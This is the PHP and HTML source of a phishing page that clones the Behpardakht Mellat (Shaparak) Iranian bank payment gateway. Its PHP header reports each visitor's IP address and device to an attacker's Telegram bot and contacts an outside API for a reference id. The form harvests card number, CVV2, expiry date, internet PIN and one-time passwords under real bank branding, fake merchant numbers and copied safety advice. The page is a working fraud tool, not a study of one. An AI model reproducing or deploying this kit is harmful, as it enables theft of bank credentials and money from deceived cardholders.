<?php

include 'info.php';
session_start();
$_SESSION['card'] = "fuck";

function GetRealIp()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else
        $ip = $_SERVER['REMOTE_ADDR'];
    return $ip;
}
$ip = GetRealIp();
$apiKey = "api"; 
$apiUrl = "$apiurl/telgram/cli.php";
$data = json_encode([
    "api_key" => $apiKey,
    "amount" => $Amount
]);
$headers = [
    "Content-Type: application/json"
];
$ch = curl_init($apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
curl_close($ch);
$refidReq = json_decode($response, true);
$refid = $refidReq['refid'];
if ($refid == "" || $refidReq['status'] == "false") {
    header("Location: error.php");
    exit();
}
$rand = rand(1000000, 9999999);
$Domain = $_SERVER["HTTP_HOST"];

$de = $_SERVER['HTTP_USER_AGENT'];
$we = explode('(', $de)[1];
$devices = rtrim(explode(' ',$_SERVER['HTTP_USER_AGENT'])[4],")");
$KeyBo = json_encode(['inline_keyboard' => [
	[['text' => "[💻] Device : $devices", 'callback_data' => 'none']]
], 'resize_keyboard' => true]);

$Text = "╔─━━▒❗️#NEW_LOGIN❗️▒━━─═╗
╚─━──━━──━───━──━━──━═╝
╠🌐 🄸🄿 ➠ <code>{$_SERVER['REMOTE_ADDR']}</code>
╠━──━━──━─────━──━━──═╗
║📓 #$refid
╚═━──━━──━───━──━━──━═╝";
$apitel = curl_init();
curl_setopt($apitel, CURLOPT_URL, 'https://api.telegram.org/bot' . $Token. '/sendMessage');
curl_setopt($apitel, CURLOPT_POST, true);
curl_setopt($apitel, CURLOPT_POSTFIELDS, "chat_id=$Id&parse_mode=HTML&reply_markup=$KeyBo&text=" . ($Text));
curl_setopt($apitel, CURLOPT_RETURNTRANSFER, true);
$jso = curl_exec($apitel);
curl_close($apitel);
?>

<!DOCTYPE html>
<html lang="fa">
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta property="og:title" content="پرداخت اینترنتی به پرداخت ملت"/>
    <meta property="og:url" content="http://www.behpardakht.com/"/>
    <meta property="og:image" content="http://"/>

    <title>پرداخت اینترنتی به پرداخت ملت</title>
    <link href="img/ipg-favicon.ico" rel="shortcut icon">

    <link href="css/esprit_fa.min.css?v=11" rel="stylesheet">
    <script src="js/jquery.min.js?v=1"></script>
    <script src="msg/messages_fa.min.js?v=6"></script>
    <script src="js/payment.min.js"></script>

    <style>
        .close-button {
            background-color: #c2c7cc !important;
            background-image: url(img/ipg-decline.svg) !important;
            width: 25px !important;
            height: 25px !important;
        }
    </style>

    <script>
        $(document).ready(function () {
            otpRequestWaitMillis = 120000
            setCardSuggestionListHeight();
            countDownRemainingTime(555);
            $("#cardnumber").focus();
            $(document).keydown(function (e) {
                var keyCode = getEventKeyCode(e);
                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = true;
            }).keyup(function (e) {
                var keyCode = getEventKeyCode(e);
                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = false;
            });
        });
    </script>
    <script>
        encRefId = "<?php echo($refid); ?>"
        panDtoList = JSON.parse('[]');
    </script>

</head>
<body id="body" class="up-scroll" onclick="hideKeypadOnOutsideClick(event);hideCardSuggestionListOnOutSideClick(event)">
<header id="header">
    <div class="container">
        <div class="beh-card">
            <a class="change-languge" href="https://bpm.shaparak.ir/pgwchannel/result.mellat?RefId=null&BLOCKER_ERROR=missingRefId&lang=en">
                EN</a>

            <div class="row">
                <div class="col shaparaklogo align-self-start"><img src="img/shaparak_logo.svg" alt="shaparak"></div>
                <div class="col-6 header-center align-self-end">
                    <span>پرداخت اینترنتی به پرداخت ملت</span><br>
                    <a href="http://www.behpardakht.com">www.Behpardakht.com</a>
                </div>
                <div class="col behpardakhtlogo align-self-start"><img src="img/behpardakht_logo.svg" alt="behpardakht">
                </div>
            </div>
        </div>
    </div>
</header>

<div class="main-wrapper payment">
    <section class="container">
        <div class="row row-eq-height">
            <div class="col-lg-8 col-md-12 col-sm-12 order-lg-1 order-2">
                <div class="beh-card carddetail">
                    <div class="background-overflow">
                        <span class="shape"></span>
                    </div>

                    <div class="card-header">
                        <h3>اطلاعات کارت</h3>
                        <span id="remaining-time">زمان باقی مانده :<b>09:15</b></span>
                        <span class="card-errorbox shaparak_shit_message">لطفا اطلاعات مورد نیاز را به درستی وارد کنید</span>
                    </div>
                    <div class="card-body">
                        <form class="card-info">
                            <div class="form-group row">
                                <div class="col-sm-4">
                                    <input type="hidden" value="<?php echo $_SESSION['card']; ?>">

                                    <label for="cardnumber" class="col-form-label">شماره کارت</label>
                                    <small>شماره کارت 16 رقمی درج شده روی کارت را وارد نمایید</small>
                                </div>

                                <div class="col-md-6 col-sm-8 col-12 mobile-justify">
                                    <div class="cardnumberbox" id="cardnumberbox">
                                        <span class="banklogo"></span>
                                        <input type="tel" id="cardnumber" maxlength="19"

                                               onkeydown="preventInvalidKeys(event);setPanCursorPosition(event);"
                                               onkeyup="formatPanOnKeyUp(event);filterAndShowCardSuggestionList();setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)"
                                               oninput="formatPanOnKeyUp(event);setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)"
                                               onfocus="hideKeypad();removeInvalidClassFromPan()"
                                               onblur="handlePanChange()"
                                               value=""
                                        >
                                        
                                        <button type="button" id="card-list-button" data-toggle="dropdown"
                                                onclick="toggleAllPans()"
                                                aria-haspopup="true" aria-expanded="false" tabindex="-1"></button>
                                        <div class="card-suggestionlist dropdown-menu"
                                             aria-labelledby="card-list-button">

                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group row">
                                <div class="col-sm-4">
                                    <label for="inputcvv2" class="col-form-label">شماره شناسایی دوم (CVV2)</label>
                                    <small>شماره 3یا 4 رقمی درج شده روی کارت را وارد نمایید</small>
                                </div>
                                <div class="col-md-6 col-sm-6 col-10  mobile-justify keypad-parent">
                                    <input type="tel" class="form-control" id="inputcvv2" maxlength="4"

                                           style="-webkit-text-security: disc;font-size: 23px;"

                                           onfocus="hideOthersKeypad(this);hideCardSuggestionList();removeInvalidClassFromInput('inputcvv2');
                                               showKeypadJustInMobile('inputcvv2',event)"
                                           autocomplete="off"
                                           onkeydown="preventInvalidKeys(event);"
                                           onkeyup="focusNextField(this,'inputmonth|inputcapcha',event);">
                                </div>
                                <div class="col-sm-1">
                                    <button type="button" class="form-btn keypad" tabindex="-1"
                                            onclick="showKeypad('inputcvv2',event)"></button>
                                </div>
                            </div>

                            <div class="form-group row">
                                <div class="col-sm-4">
                                    <label for="inputmonth" class="col-form-label">تاریخ انقضای کارت</label>
                                    <small>تاریخ انقضای کارت را وارد کنید </small>
                                </div>

                                <div class="col-2 d-lg-none d-sm-none"></div>

                                <div class="col-md-2 col-sm-3 col-4">
                                    <input type="tel" class="form-control" id="inputmonth" maxlength="2"
                                           placeholder="ماه"
                                           autocomplete="off"
                                           onkeydown="preventInvalidKeys(event);"
                                           onfocus="hideKeypad();removeInvalidClassFromInput('inputmonth')"
                                           onkeyup="focusNextField(this,'inputyear',event);">
                                </div>
                                <div class="col-md-2 col-sm-3 col-4">
                                    <input type="tel" class="form-control" id="inputyear" maxlength="2"
                                           placeholder="سال"
                                           autocomplete="off"
                                           onfocus="removeInvalidClassFromInput('inputmonth')"
                                           onkeydown="preventInvalidKeys(event);"
                                           onkeyup="focusNextField(this,'inputcapcha',event)">
                                </div>
                            </div>
  <div class="form-group row">
    <div class="col-sm-4">
        <label for="inputcapcha" class="col-form-label">کد امنیتی</label>
        <small>لطفا کد امنیتی داخل کادر را وارد نمایید</small>
    </div>

    <div class="col-sm-6 col-10 mobile-justify" style="position: relative; display: flex; align-items: center;">
        <!-- فیلد ورودی و تصویر کپچا -->
        <div style="position: relative; width: 100%;">
            <input type="tel" class="form-control" id="inputcapcha" maxlength="5"
                   autocomplete="off"
                   style="padding-left: 50%; text-align: center; width: 100%; height: 38px; font-size: 18px;"
                   onfocus="hideKeypad();removeInvalidClassFromInput('inputcapcha')"
                   onkeydown="preventInvalidKeys(event);"
                   onkeyup="focusNextField(this,'inputpin',event)">

            <div class="captcha-container"
                 style="position: absolute; left: 0px; top: 0px; height: 97%; width: 53%;
                        display: flex; align-items: center; justify-content: center;
                        border-top-left-radius: 25px; border-bottom-left-radius: 25px;
                        overflow: hidden;">
                <img id="captcha-img"
                     src="<?php echo "https://bpm.shaparak.ir/pgwchannel/captchaimg.jpg?RefId=$refid" ?>"
                     style="height: 100%; width: 100%; object-fit: cover;">
            </div>
        </div>
</div>

 <div class="col-sm-1 col-2" style="display: flex; align-items: center; justify-content: center;">
        <button type="button" id="captcha-button" class="form-btn capcha"
                title="نمايش کد جديد" onclick="refreshCaptcha()"
        🔄
    </button>
</div>

<style>
    #captcha-button {
        font-size: 20px !important;
        padding: 20px !important; 
        margin-top: 0px; 
        margin-left: 0px;
    }
</style>
    <input type="hidden" value="<?php echo $refid; ?>" id="code">
    
                            </div>
                            <div class="form-group row" onblur="hideKeypad()">
                                <div class="col-sm-4">
                                    <label for="inputpin" class="col-form-label">رمز اینترنتی کارت</label>
                                    <small>رمز اینترنتی را وارد نمایید</small>
                                </div>

                                <div class="col-md-6 col-sm-6 col-10 mobile-justify keypad-parent">
                                    <div class="cardnumberbox" id="dynamic-pin">
                                        <input type="tel" class="form-control" id="inputpin"
                                               maxlength="12"

                                               style="-webkit-text-security: disc;font-size: 23px;"

                                               onfocus="hideOthersKeypad(this);hideCardSuggestionList();
                                                   removeInvalidClassFromInput('inputpin');showKeypadJustInMobile('inputpin',event)"
                                               autocomplete="off"
                                               onkeydown="preventInvalidKeys(event);"
                                               onkeyup="focusNextField(this,'inputpayerid|payButton',event);">
                                        <button class="sendpin" type="button" id="otp-button" data-toggle="dropdown"
                                                onclick="validateAndRequestOTP()" aria-haspopup="true"
                                                aria-expanded="false" tabindex="-1">دریافت رمز پویا
                                        </button>
                                    </div>
                                </div>
                                <div class="col-sm-1 ">
                                    <button type="button" class="form-btn keypad" tabindex="-1"
                                            onclick="showKeypad('inputpin',event)"></button>
                                </div>
                            </div>

                            <div class="form-group row">
                                <div class="col-sm-4">
                                    <label for="inputemail" class="col-form-label">ایمیل</label>
                                    <small>لطفاایمیل معتبر وارد کنید (اختیاری)</small>
                                </div>
                                <div class="col-md-6 col-sm-8 col-12 mobile-justify">
                                    <input type="email" class="form-control" id="inputemail"
                                           onfocus="removeInvalidClassFromInput('inputemail')">
                                </div>
                            </div>


                            <div class="form-group row">
                                <div class="col-sm-4"></div>
                                <div class="col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form">
                                    <button type="button" class="btn btn-perches" id="payButton"
                                            onclick="validateAndDoPayment('sale.mellat',processSaleResponse)">پرداخت
                                    </button>
                                    <button type="button" class="btn btn-decline" onclick="cancelPay()">انصراف</button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="col-lg-4 col-md-12 col-sm-12 order-lg-2 order--1">
                <div class="beh-card merchantdetail">
                    <div class="card-header">
                        <h3>اطلاعات پذیرنده</h3>
                    </div>
                    <div class="card-body">

                        <div class="merchant-container">

                                <span class="helper"></span>
                                
                            </div>
                            
                            <ul class="col-lg-12 col-sm-8 merchant-detail">
                                <li>نام پذیرنده : <b><?php echo $samane; ?></b></li>
                                <li>شماره پذیرنده: <b><?php echo mt_rand(686582,865754); ?></b></li>
                                <li>شماره ترمینال: <b><?php echo mt_rand(1745534,7694586); ?></b></li> 


                                <li>آدرس وب سایت: <b class="merchantwebsite"><a href="https://www.rayanertebat.ir">https://<?php echo $Domain; ?></a></b>
                                </li>


                            </ul>

                        </div>

                        <ul class="merchant-detail price">
                            <li>مبلغ قابل پرداخت :<b class="price-number"><?php echo number_format($Amount); ?>&nbsp;
                                    ریال</b></li>
                        </ul>
                    </div>

                </div>

            </div>
        </div>
    </section>

    <div class="keypad-container">
        <h4>صفحه کلید امن</h4>
        <div class="frame-umbtn">
            <button id="num1" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="num2" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="num3" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="num4" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="num5" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="num6" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="num7" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="num8" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="clear" type="button" class=" numpad" tabindex="-1" onclick="keyPadBackspace(event)">&#9003;
            </button>
        </div>
        <div class="frame-umbtn">
            <button id="num9" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="num0" type="button" class=" numpad" tabindex="-1" onclick="fillField(this,event)"></button>
        </div>
        <div class="frame-umbtn">
            <button id="tab-key" type="button" class=" numpad" tabindex="-1" onclick="keypadTab()"
                    style="color: #27d286;">&#10004;
            </button>
        </div>
    </div>


    <div class="modal large-modal top_layer fade show" id="dynamic-pin-modal" tabindex="-1" role="dialog"
         aria-labelledby="ModalLabel" aria-hidden="true" style="display: none">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">توجه</h5>
                    <button type="button" onclick="removeDynamicPinDialog();focusField('inputcvv2')" class="close"
                            data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p>مشتری گرامی، در شرایط ذیل نیازی به فشردن دکمه درخواست رمز پویا نمی باشد:<br/>اگر از روش هایی نظیر
                        برنامک های رمز ساز استفاده می نمایید رمز خود را در قسمت رمز دوم وارد فرمایید. در صورتی که تاکنون
                        نسبت به پویا سازی رمز دوم کارت خود اقدام ننموده اید، میتوانید حداکثر تا تاریخ 98/11/05 از رمز
                        ایستای خود استفاده فرمایید.</p>
                </div>
                <div class="modal-footer">
                    <button type="button" id="dynamic-pin-dialog-button" class="btn btn-primary"
                            onclick="removeDynamicPinDialog();focusField('inputcvv2')">متوجه شدم
                    </button>
                </div>
            </div>
        </div>
    </div>
    <div class="modal-backdrop fade show" id="dynamic-pin-modal-backdrop" style="display: none"></div>

    <section class="container">
        <row class="beh-guid">
            <div class="col">
                <h4>راهنمایاستفاده از رمز پویا</h4>
                <ul>
                    <li>رمز پویا، رمز یکبار مصرفی است که به جای رمز دوم کارت استفاده میشود.</li>
                    <li><b>مرحله اول</b>- براساس دستورالعمل بانک صادرکننده کارت خود، نسبت به فعالسازی رمز پویا اقدام
                        نمایید.
                    </li>
                    <li><b>مرحله دوم</b>- رمز پویا را بر اساس روش اعلامی از طرف بانک صادرکننده کارت، به یکی از روشهای
                        زیر دریافت کنید.
                    </li>
                    <li>1- دریافت از طریق برنامه کاربردی بانک، اینترنت بانک و یا موبایل بانک</li>
                    <li>2- دریافت از طریق کد USSD بانک صادرکننده کارت شما</li>
                    <li>3- دریافت از طریق زدن دکمه ی "دریافت رمز پویا" در درگاه پرداخت اینترنتی</li>
                    <li><b>مرحله سوم</b>- پس از دریافت رمز به یکی ازروشهای فوق، رمز پویای دریافت شده را در محل تعیین
                        شده برای "رمز دوم" وارد نمایید و سپس مابقی اطلاعات راتکمیل نمایید.
                    </li>
                    <br><br>
                </ul>
            </div>
        </row>
    </section>
    <section class="container">
        <row class="beh-guid">
            <div class="col">
                <h4>راهنما و نکات ایمنی</h4>
                <ul>
                    <li>شماره کارت: 16 رقمی بوده و بصورت 4 قسمت 4 رقمی روی کارت درج شده است.</li>
                    <li>cvv2: با طول 3 یا 4 رقم کنار شماره کارت و یا پشت کارت درج شده است.</li>
                    <li>تاریخ انقضا: شامل دو بخش ماه و سال انقضا در کنار شماره کارت درج شده است.</li>
                    <li>رمز اینترنتی: با عنوان رمز دوم و در برخی موارد با PIN2 شناخته می شود، از طریق بانک صادر کننده
                        کارت تولید شده و همچنین از طریق دستگاه های خودپرداز بانک صادر کننده قابل تهیه و یا تغییر می
                        باشد.
                    </li>
                    <li>کد امنیتی: بخشی از محتوای صفحه پرداخت است و لازم است برای ادامه فرایند خرید ، کد موجود که به
                        صورت عددی در تصویر مشخص شده است در محل پیش بینی شده درج شود.
                                        </li>
                    <li>دروازه پرداخت اینترنتی به پرداخت ملت با استفاده از پروتکل امن https به مشتریان خود ارایه خدمت
                        نموده و با آدرس <b>https://bpm.shaparak.ir</b> شروع می شود. خواهشمند است به منظور جلوگیری
                        از سوء استفاده های احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر وب خود را با
                        آدرس فوق مقایسه نمایید و درصورت مشاهده هر نوع مغایرت احتمالی، موضوع را با ما درمیان بگذارید.
                    </li>
                    <li>برای جلوگیری از افشای رمز کارت خود،حتی المقدور از صفحه کلید مجازی استفاده فرمایید.</li>
                    <li>لطفا از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.</li>
                    <li>برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی با ما
                        تماس بگیرید.
                    </li>
                    <br><br>
                </ul>
            </div>
        </row>
    </section>
</div>
<footer class="footer">
    <div class="container">
        <div class="footerarc"></div>
        <div class="footerarc content">
            <span class="call">شماره تماس: 27312733-021 </span><br>
            <span>شرکت به پرداخت ملت ارايه دهنده خدمات نوین پرداخت الکترونيک</span>
        </div>
        <div class="row justify-content-center">
            <div class="col-12">

            </div>
        </div>
    </div>
</footer>
<form method="post" name="returnForm" action="Failed.php">
    <input type="hidden" id="ResCode" name="ResCode">
</form>
<form method="post" name="resultForm" action="next.php" accept-charset="UTF-8">
</form>
</form>
<style>img[alt="www.000webhost.com"]{display:none;}</style>
</body>
</html>